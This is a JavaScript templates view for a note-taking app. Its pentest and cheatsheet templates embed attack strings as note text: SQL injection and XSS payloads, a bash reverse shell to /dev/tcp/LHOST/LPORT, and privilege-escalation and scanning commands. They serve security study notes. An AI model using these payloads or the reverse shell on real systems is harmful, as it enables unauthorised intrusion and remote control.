/**
 * GhostVault — templates view.
 * Mirrors the Electron app's template library (work, cyber, personal, pentest, cheatsheet).
 * Clicking a template creates a new note via the API with the template content pre-filled.
 *
 * @param {HTMLElement} container
 * @param {string} vaultToken
 * @param {string[]} folders
 * @param {(note: object) => void} onCreated  — called after note is created
 */
export function renderTemplates(container, vaultToken, folders, onCreated) {
  container.innerHTML = '';

  const ts = () => new Date().toISOString().replace('T', ' ').slice(0, 16);

  const GROUPS = {
    'Work':       ['customer', 'meeting', 'project', 'tasks', 'quickthought', 'weekly'],
    'Cyber':      ['htb', 'webapp', 'privesc', 'enum', 'exploit', 'recon', 'lab'],
    'Personal':   ['journal', 'braindump', 'reminder', 'idea', 'studynotes', 'general'],
    'Pentest':    ['webapp_pentest', 'network_pentest', 'api_testing'],
    'Cheatsheet': ['cs_linux', 'cs_nmap', 'cs_sqli', 'cs_xss', 'cs_revshells', 'cs_privesc'],
  };

  const LABELS = {
    customer: 'Customer Call',    meeting: 'Meeting Notes',
    project: 'Project Update',    tasks: 'Task List',
    quickthought: 'Quick Thought', weekly: 'Weekly Review',
    htb: 'HTB Machine',           webapp: 'Web App Recon',
    privesc: 'PrivEsc Checklist', enum: 'Enumeration',
    exploit: 'Exploit Notes',     recon: 'Recon Report',
    lab: 'Lab Writeup',           journal: 'Journal Entry',
    braindump: 'Brain Dump',      reminder: 'Reminder',
    idea: 'Idea',                 studynotes: 'Study Notes',
    general: 'General Note',
    webapp_pentest: 'Web App Pentest', network_pentest: 'Network Pentest',
    api_testing: 'API Testing',
    cs_linux: 'Linux Commands', cs_nmap: 'Nmap Cheatsheet',
    cs_sqli: 'SQLi Payloads',   cs_xss: 'XSS Payloads',
    cs_revshells: 'Reverse Shells', cs_privesc: 'Privilege Escalation',
  };

  const FOLDER_HINT = {
    customer: 'Meetings', meeting: 'Meetings', project: 'Projects',
    tasks: 'Tasks', quickthought: 'Notes', weekly: 'Notes',
    htb: 'Study', webapp: 'Study', privesc: 'Study', enum: 'Study',
    exploit: 'Study', recon: 'Study', lab: 'Study',
    webapp_pentest: 'Projects', network_pentest: 'Projects', api_testing: 'Projects',
    journal: 'Notes', braindump: 'Notes', reminder: 'Tasks', idea: 'Notes',
    studynotes: 'Study', general: 'Notes',
    cs_linux: 'Study', cs_nmap: 'Study', cs_sqli: 'Study',
    cs_xss: 'Study', cs_revshells: 'Study', cs_privesc: 'Study',
  };

  const shell = document.createElement('div');
  shell.className = 'gv-templates';

  let activeGroup = 'Cyber';

  const tabs = Object.keys(GROUPS).map(g =>
    `<button class="gv-tab-btn${g === activeGroup ? ' active' : ''}" data-group="${g}">${g}</button>`
  ).join('');

  shell.innerHTML = `
    <div class="gv-templates-header">
      <div class="gv-section-title">Templates</div>
    </div>
    <nav class="gv-tabs" id="gv-tmpl-tabs">${tabs}</nav>
    <div class="gv-templates-grid" id="gv-tmpl-grid"></div>
    <div id="gv-tmpl-status" class="gv-success" style="display:none;"></div>
  `;
  container.appendChild(shell);

  const tabsEl = shell.querySelector('#gv-tmpl-tabs');
  const gridEl = shell.querySelector('#gv-tmpl-grid');
  const statusEl = shell.querySelector('#gv-tmpl-status');

  tabsEl.querySelectorAll('.gv-tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      activeGroup = btn.dataset.group;
      tabsEl.querySelectorAll('.gv-tab-btn').forEach(b => b.classList.toggle('active', b.dataset.group === activeGroup));
      _renderGrid();
    });
  });

  _renderGrid();

  function _renderGrid() {
    gridEl.innerHTML = '';
    const keys = GROUPS[activeGroup] || [];
    for (const key of keys) {
      const card = document.createElement('div');
      card.className = 'gv-tmpl-card';
      card.innerHTML = `
        <div class="gv-tmpl-name">${LABELS[key] || key}</div>
        <div class="gv-tmpl-folder">${FOLDER_HINT[key] || 'Notes'}</div>
      `;
      card.addEventListener('click', () => _createFromTemplate(key));
      gridEl.appendChild(card);
    }
  }

  async function _createFromTemplate(key) {
    const content = _getTemplate(key, ts());
    const title = `${LABELS[key] || key} — ${ts()}`;
    const folder = _resolveFolder(FOLDER_HINT[key] || 'Notes');

    try {
      const res = await fetch('/api/cyberapps/ghostvault/notes', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Vault-Token': vaultToken,
        },
        body: JSON.stringify({ title, content, folder, template: key }),
      });
      if (res.ok) {
        const d = await res.json();
        _showStatus(`Created "${title}"`);
        onCreated(d.note);
      } else {
        _showStatus('Failed to create note', true);
      }
    } catch (_) {
      _showStatus('Network error', true);
    }
  }

  function _resolveFolder(preferred) {
    return folders.includes(preferred) ? preferred : (folders[0] || 'Notes');
  }

  function _showStatus(msg, isError = false) {
    statusEl.textContent = msg;
    statusEl.className = isError ? 'gv-error' : 'gv-success';
    statusEl.style.display = 'block';
    setTimeout(() => { statusEl.style.display = 'none'; }, 3000);
  }

  function _getTemplate(key, now) {
    const T = {
      customer: `# Customer Call\n\n**Date:** ${now}\n**Contact:**\n**Phone:**\n**Email:**\n\n---\n\n## Issue / Request\n\n---\n\n## Actions Required\n\n- [ ]\n`,
      meeting: `# Meeting\n\n**Date:** ${now}\n**Attendees:**\n\n---\n\n## Agenda\n\n---\n\n## Action Items\n\n| Task | Owner | Due |\n|------|-------|-----|\n|      |       |     |\n`,
      project: `# Project Update\n\n**Date:** ${now}\n**Status:** On Track\n\n---\n\n## Progress\n\n---\n\n## Blockers\n\n---\n\n## Next Steps\n\n- [ ]\n`,
      tasks: `# Task List — ${now}\n\n## Urgent\n\n- [ ]\n\n## This Week\n\n- [ ]\n\n## Backlog\n\n- [ ]\n`,
      quickthought: `# Quick Thought — ${now}\n\n---\n\n`,
      weekly: `# Weekly Review — ${now}\n\n## What went well\n\n---\n\n## What to improve\n\n---\n\n## Next week\n\n- [ ]\n`,
      htb: `# HTB — Machine\n\n> **IP:** \`10.10.x.x\` | **OS:** Linux | **Difficulty:** Medium | **Date:** ${now}\n\n---\n\n## Enumeration\n\n\`\`\`bash\nnmap -sV -sC -oN nmap/initial 10.10.x.x\n\`\`\`\n\n## Credentials\n\n| Username | Password | Service |\n|----------|----------|---------|\n|          |          |         |\n\n## Exploitation\n\n## Flags\n\n- User: \`\`\n- Root: \`\`\n`,
      webapp: `# Web App Recon\n\n> **URL:** \`https://\` | **Date:** ${now}\n\n---\n\n## Recon\n\n\`\`\`bash\nffuf -u https://target/FUZZ -w wordlist.txt\n\`\`\`\n\n## Findings\n\n| Endpoint | Vulnerability | Severity |\n|----------|---------------|----------|\n|          |               |          |\n`,
      privesc: `# Privilege Escalation — ${now}\n\n\`\`\`bash\nsudo -l\nfind / -perm -u=s -type f 2>/dev/null\n\`\`\`\n\n## Vector\n\n`,
      enum: `# Enumeration — ${now}\n\n| IP | Port | Service | Notes |\n|----|------|---------|-------|\n|    |      |         |       |\n`,
      exploit: `# Exploit Notes — ${now}\n\n**CVE / Type:**\n**Target:**\n\n\`\`\`bash\n\n\`\`\`\n`,
      recon: `# Recon Report\n\n> **Target:** \`\` | **Date:** ${now}\n\n---\n\n## Summary\n\n## Hosts\n\n| IP | Hostname | Ports |\n|----|----------|-------|\n|    |          |       |\n`,
      lab: `# Lab Writeup — ${now}\n\n**Platform:**\n**Difficulty:**\n\n---\n\n## Steps\n\n### 1.\n\n## Key Learnings\n\n## Flags\n\n`,
      journal: `# Journal — ${now}\n\n---\n\n## What happened\n\n---\n\n## Grateful for\n\n---\n\n## Reflection\n\n`,
      braindump: `# Brain Dump — ${now}\n\n---\n\n`,
      reminder: `# Reminder — ${now}\n\n**When:**\n\n---\n\n## Action needed\n\n- [ ]\n`,
      idea: `# Idea — ${now}\n\n## What is it?\n\n## Why does it matter?\n\n## Next step\n\n- [ ]\n`,
      studynotes: `# Study Notes — ${now}\n\n**Topic:**\n**Source:**\n\n---\n\n## Key Concepts\n\n## Notes\n\n## Questions\n\n`,
      general: `# Note — ${now}\n\n---\n\n`,
      webapp_pentest: `# Web App Pentest — ${now}\n\n**Target:**\n**Scope:**\n\n---\n\n## Recon\n\n- [ ] WHOIS / DNS\n- [ ] Subdomain discovery\n\n## Exploitation\n\n| Finding | Severity |\n|---------|----------|\n|         |          |\n`,
      network_pentest: `# Network Pentest — ${now}\n\n**Target Range:**\n\n\`\`\`bash\nnmap -sn <cidr>\n\`\`\`\n\n| Host | Port | Service |\n|------|------|---------|\n|      |      |         |\n`,
      api_testing: `# API Testing — ${now}\n\n**Base URL:**\n**Auth Type:**\n\n| Method | Endpoint | Auth | Notes |\n|--------|----------|------|-------|\n| GET    |          |      |       |\n`,
      cs_linux: `# Linux Commands Cheatsheet\n\n\`\`\`bash\nls -la\nfind / -name "*.conf"\ngrep -r "pattern" /dir\n\`\`\`\n`,
      cs_nmap: `# Nmap Cheatsheet\n\n\`\`\`bash\nnmap -sV -sC -oN output.txt <target>\nnmap -p- <target>\nnmap -sn <cidr>\n\`\`\`\n`,
      cs_sqli: `# SQL Injection\n\n\`\`\`sql\n' OR '1'='1\n' UNION SELECT NULL--\n' AND SLEEP(5)--\n\`\`\`\n`,
      cs_xss: `# XSS Payloads\n\n\`\`\`html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n\`\`\`\n`,
      cs_revshells: `# Reverse Shells\n\n\`\`\`bash\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1\npython3 -c 'import pty;pty.spawn("/bin/bash")'\n\`\`\`\n`,
      cs_privesc: `# PrivEsc Cheatsheet\n\n\`\`\`bash\nsudo -l\nfind / -perm -4000 -type f 2>/dev/null\n\`\`\`\n`,
    };
    return T[key] || `# Note — ${now}\n\n---\n\n`;
  }
}
